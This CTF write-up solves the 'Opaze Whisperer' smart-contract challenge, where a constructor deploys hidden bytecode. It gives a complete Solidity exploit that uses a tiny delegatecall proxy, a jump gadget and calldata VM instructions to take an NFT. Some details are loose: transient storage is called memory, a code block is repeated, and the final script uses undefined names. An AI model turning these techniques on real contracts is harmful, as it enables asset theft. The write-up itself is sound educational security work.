# Opaze Whisperer: Breaking Constructor-Time Contract Deployment

In this CTF challenge, we explore a vulnerability in a smart contract's deployment process where the constructor returns different bytecode than what appears in the source code. The challenge demonstrates how constructor-time code modification can lead to unexpected contract behavior and complex bytecode-level exploitation.

## Challenge Overview

The challenge presents us with two smart contracts where:
- An Opaze NFT contract implements a basic ERC-721 token
- The OpazeWhisperer contract holds the only minted Opaze NFT
- Players must acquire the NFT from the OpazeWhisperer
- The contract's actual behavior differs from its source code

The system implements several standard components:
- ERC-721 token implementation
- Constructor-time bytecode modification
- Answer verification through keccak256
- Basic access control through ownership

The challenge setup provides players with:
- The Opaze NFT contract source code
- The OpazeWhisperer contract source code
- Deployment transaction data
- Transaction history showing contract interactions

## Initial Code Analysis

Let's examine the core mechanics and smart contracts in detail.

### Opaze NFT Contract

First, let's look at the NFT implementation:

```solidity
contract Opaze is ERC721 {
    bool public minted;

    constructor(
        string memory _name,
        string memory _symbol
    ) ERC721(_name, _symbol) {}

    function mintTo(address recipient) public payable returns (uint256) {
        require(!minted, "Already minted");
        minted = !minted;
        _mint(recipient, 1);
        return 1;
    }

    function tokenURI(uint256 id) public view virtual override returns (string memory) {
        return "";
    }
}
```

Key observations:
1. Single mint functionality
2. Token ID is always 1
3. Simple ownership tracking

### OpazeWhisperer Contract

The main contract that holds the NFT:

```solidity
contract OpazeWhisperer {
    address public opaze;
    address public owner;
    bytes32 public answer;

    constructor(address _opaze, bytes memory y) {
        opaze = _opaze;
        owner = msg.sender;

        function() internal $;
        assembly{
            $ := shl(0x20, 0x6b2)
        }$();
    }

    function riddle() public pure returns (string memory) {
        return "The curious mind that dares to seek...";
    }

    function setAnswer(string memory _answer) public {
        require(msg.sender == owner);
        answer = keccak256(abi.encode(_answer));
    }

    function play(string memory _answer) public payable {
        require(answer != 0, "Answer not set");
        require(keccak256(abi.encode(_answer)) == answer, "Incorrect answer");
        owner = msg.sender;
        _ERC721(opaze).transferFrom(address(this), msg.sender, 1);
    }
}
```

## Finding the Vulnerability

After analyzing the deployment transaction and contract interactions, two key insights emerged:

1. The constructor modifies final deployment bytecode
2. The deployed version of `play()` contains additional checks

The most interesting aspect is at address 0x6b2 in the deployment bytecode:

```assembly
0x6b2: JUMPDEST  
0x6b3: PUSH2     0x683
0x6b6: PUSH2     0x7a8
0x6b9: RETURN    
```

This code returns different bytecode than what appears in the source, specifically modifying the `play()` function's implementation.

### Custom VM Implementation

After the initial EXTCODECOPY check, the contract implements a custom VM:

```assembly
0x2d4: JUMPDEST  
0x2d5: CALLDATASIZE
0x2d6: DUP2      
0x2d7: LT        
0x2d8: ISZERO    
0x2d9: PUSH2     0x17a
0x2dc: JUMPI     
0x2dd: DUP1      
0x2de: CALLDATALOAD
0x2df: PUSH0     
0x2e0: BYTE      
0x2e1: PUSH2     0x1337
0x2e4: TLOAD     
0x2e5: MUL       
0x2e6: DUP1      
0x2e7: ISZERO    
0x2e8: PUSH2     0x308
0x2eb: JUMPI     
0x2ec: PUSH1     0x11
0x2ee: DUP2      
0x2ef: EQ        
0x2f0: PUSH2     0x330
0x2f3: JUMPI     
0x2f4: PUSH1     0x22
0x2f6: DUP2      
0x2f7: EQ        
0x2f8: PUSH2     0x38c
0x2fb: JUMPI     
0x2fc: PUSH1     0x33
0x2fe: DUP2      
0x2ff: EQ        
0x300: PUSH2     0x3d5
0x303: JUMPI     
```

The VM implements three key operations:
- 0x11: Stack push operation
- 0x22: Call operation
- 0x33: Memory store operation

However, before the VM can execute, it requires a non-zero value at memory address 0x1337. This can be achieved using a specific gadget in the contract:

```assembly
0x660: JUMPDEST  
0x661: PUSH1     0x1
0x663: PUSH2     0x1337
0x666: TSTORE    
0x667: CALLVALUE 
0x668: JUMP      
```

This gadget:
1. Stores 1 at memory address 0x1337
2. Uses CALLVALUE as the next jump target
3. Enables VM operation through the required memory initialization

To properly execute the VM:
1. First jump to 0x660 to initialize memory location 0x1337
2. Use CALLVALUE to specify 0x2d4 as the next jump target
3. Begin VM execution with prepared calldata

### Analyzing Transaction Data

The `setAnswer` transaction reveals the answer is simply "answer":

```
input: 0x55c9f80700000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000006616e737765720000000000000000000000000000000000000000000000000000
```

Verifying on-chain:
```
$ cast call 0x93BD5a3Ab7b0AA0F497706560a6A4a046ba38470 "answer()"
0x73bdee61ee38823b5142b2b7da5e10db33e641a3f3aba17b64f968ab0e71bda0
```

However, attempting to call `play()` with the correct answer fails:
```
Error: server returned an error response: error code -32603: EVM error InvalidJump
```

## The Exploit

Let's break down the actual deployed bytecode's behavior.

### Modified play() Implementation

The deployed version adds checks before NFT transfer:

```assembly
0x2ae: EXTCODESIZE
0x2af: PUSH1     0xa
0x2b1: DUP2      
0x2b2: GT        
0x2b3: ISZERO    
0x2b4: PUSH2     0x2b9
0x2b7: JUMPI     
0x2b8: STOP      
0x2b9: JUMPDEST  
0x2ba: POP       
0x2bb: PUSH1     0x2
0x2bd: PUSH1     0x8
0x2bf: PUSH0     
0x2c0: CALLER    
0x2c1: EXTCODECOPY
```

Key requirements:
1. Caller must be a contract
2. Caller's code size must be ≤ 10 bytes
3. Bytes at offset 8-9 are used as a jump target

### Building the Exploit

The attack requires a specific sequence of jumps and operations:

1. Set up the minimal proxy contract (≤10 bytes):
```solidity
contract Proxy {
   constructor() {
       assembly {
           mstore(0, 0x5F5F5F5F335aF400414100000000000000000000000000000000000000000000)    // gas caller push0 push0 push0 push0 delegatecall
           mstore8(8, 0x06)    // offset for initial jump
           mstore8(9, 0x60)
           return(0, 10)
       }
   }
}
```

2. Execute the jump sequence:
   - Initial call includes a callvalue of 0x02D4 (target for final VM execution)
   - Delegate call transfers execution to OpazeWhisperer
   - Jump to 0x660 gadget for memory initialization
   - Gadget stores 1 at memory location 0x1337
   - Use CALLVALUE (0x02D4) to jump to VM entry point
   - Begin VM instruction execution with prepared calldata

3. Construct VM instructions for NFT transfer:
```solidity
bytes memory payload = bytes.concat(
    data,    // "play(string)" with "answer"
    hex"00000000000000000000000000000000000000000000000000000000",  // padding
    
    // VM instruction sequence:
    hex"11020080",    // Push operation
    hex"11020000",    // Push operation
    hex"11020000",    // Push operation
    hex"1114", abi.encodePacked(address(PLAYER)),    // Push player address
    
    // Build transferFrom call
    hex"33", hex"23b872dd000000000000000000000000769f3e5057b43b0d511065ed74df982e",    // Store opcode
    hex"33", hex"9134da9c000000000000000000000000d2d86433d89c204bf5f2451bbc98175a",    // Store opcode
    hex"33", hex"1fc4cd6900000000000000000000000000000000000000000000000000000000",    // Store opcode
    hex"33", hex"00000001fffffff1000000010000000100000001000000010000000100000001",    // Store opcode
    
    hex"22"    // Call operation
);
```

The VM execution sequence:
1. Push operations (0x11) set up stack for the call
2. Store operations (0x33) construct the transferFrom call data
3. Final call operation (0x22) executes the NFT transfer

This precise sequence ensures:
```solidity
contract Proxy {
   constructor() {
       assembly {
           mstore(0, 0x5F5F5F5F335aF400414100000000000000000000000000000000000000000000)
           mstore8(8, 0x06)
           mstore8(9, 0x60)
           return(0, 10)
       }
   }
}
```

2. The main exploit contract that handles the VM interaction:
```solidity
contract Exploit {
   OpazeWhisperer immutable target;
   address immutable PLAYER;
   address proxy;
   
   constructor(OpazeWhisperer _target, address _proxy, address player) {
       target = _target;
       proxy = _proxy;
       PLAYER = player;
   }
   
   function pwn() external payable {
       (bool success,) = address(proxy).call{gas: 100000, value: 0x02D4}("");
       require(success, "Call failed1");
   }

   fallback() external payable {
        bytes memory data = abi.encodeWithSignature(
           "play(string)",
           "answer"
       );

        bytes memory payload = bytes.concat(
           data,
           // ... VM instructions for NFT transfer ...
        );

        (bool success,) = address(target).call{gas: 100000, value: 0x02D4}(payload);
        require(success, "Call failed2");
   }
}
```

### Why It Works

The exploit succeeds because:
1. The proxy contract satisfies the 10-byte size limit
2. Delegate call allows executing arbitrary code
3. Memory location 0x1337 is properly initialized via the gadget
4. VM instructions in the calldata execute the NFT transfer
5. The contract's jump validation is bypassed

## Complete Solution

```solidity
import {Script, console} from "forge-std/Script.sol";
pragma solidity ^0.8.0;

import "src/Challenge.sol";
import "src/Opaze.sol";
import "src/OpazeWhisperer.sol";

contract Proxy {
   constructor() {
       assembly {
           mstore(0, 0x5F5F5F5F335aF400414100000000000000000000000000000000000000000000)
           mstore8(8, 0x06)
           mstore8(9, 0x60)
           return(0, 10)
       }
   }
}

contract Exploit {
   OpazeWhisperer immutable target;
   address immutable PLAYER;
   address proxy;
   
   constructor(OpazeWhisperer _target, address _proxy, address player) {
       target = _target;
       proxy = _proxy;
       PLAYER = player;
   }
   
   function pwn() external payable {
       (bool success,) = address(proxy).call{gas: 100000, value: 0x02D4}("");
       require(success, "Call failed1");
   }

   fallback() external payable {
        bytes memory data = abi.encodeWithSignature(
           "play(string)",
           "answer"
        );

        bytes memory payload = bytes.concat(
           data,
           hex"00000000000000000000000000000000000000000000000000000000",
           hex"11020080",
           hex"11020000",
           hex"11020000",
           hex"1114", abi.encodePacked(address(PLAYER)),
           hex"33", hex"23b872dd000000000000000000000000769f3e5057b43b0d511065ed74df982e",
           hex"33", hex"9134da9c000000000000000000000000d2d86433d89c204bf5f2451bbc98175a",
           hex"33", hex"1fc4cd6900000000000000000000000000000000000000000000000000000000",
           hex"33", hex"00000001fffffff1000000010000000100000001000000010000000100000001",
           hex"22"
        );

        (bool success,) = address(target).call{gas: 100000, value: 0x02D4}(payload);
        require(success, "Call failed2");
   }
}

contract CounterScript is Script {
    function run() public {
        vm.startBroadcast(privateKey);
        chal.solve();
        vm.stopBroadcast();
    }
}
```

## Key Takeaways

1. Constructor-time code modification can lead to unexpected contract behavior
2. Bytecode analysis is crucial for understanding actual contract implementation
3. Size-restricted contract calls can be handled through proxy patterns
4. Complex VM operations can be encoded in calldata for execution

This challenge demonstrates how constructor-time bytecode modification can create contracts that behave differently than their source code suggests, requiring careful bytecode analysis and creative exploitation techniques.
